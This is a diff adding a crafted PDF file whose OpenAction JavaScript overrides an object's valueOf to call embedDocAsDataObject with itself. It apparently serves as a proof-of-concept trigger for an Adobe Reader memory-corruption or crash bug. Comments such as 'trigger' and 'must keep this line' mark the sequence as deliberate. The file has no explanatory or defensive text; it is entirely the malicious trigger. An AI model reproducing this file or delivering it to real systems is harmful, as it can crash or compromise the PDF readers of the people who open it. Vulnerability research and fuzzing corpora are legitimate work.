@@ -1,0 +1,63 @@
+%PDF-1.6
+
+1 0 obj
+<<
+/Kids
+  [<<
+  /Parent 1 0 R
+  /Contents[3 0 R]
+  >>]
+  /Resources<<>>
+>>
+%endobj
+
+3 0 obj<<>>
+stream
+BT/F1 105 Tf 0 400 Td(Adobe Reader)Tj ET
+endstream
+endobj
+
+trailer
+<<
+/Root
+  <<
+  /AcroForm
+  <<
+    /Fields
+      [
+      <<
+        /Rect[10 10 10 10]
+        /Subtype/Widget
+        /T(mytext)
+        /V(this is a text)
+        /FT/Tx
+      >>]
+  >>
+  /OpenAction
+    <<
+    /S /JavaScript
+    /JS(
+
+var ooo = new Object();
+
+app.trigger = function() {
+    app.doc.embedDocAsDataObject({cName:"http://www.B.com", oDoc:app.trigger});
+}
+
+
+//must keep this line
+//cannot execute on AcroRd32.exe
+try{app.doc.newPage({nWidth:200, nHeight:72, nPage:2});}catch(e){}
+
+//trigger
+try{ooo.valueOf = app.trigger;}catch(e){}
+
+//must keep this line 
+try{ooo.valueOf();}catch(e){}
+
+
+      )
+    >>
+  /Pages 1 0 R
+  >>
+>>
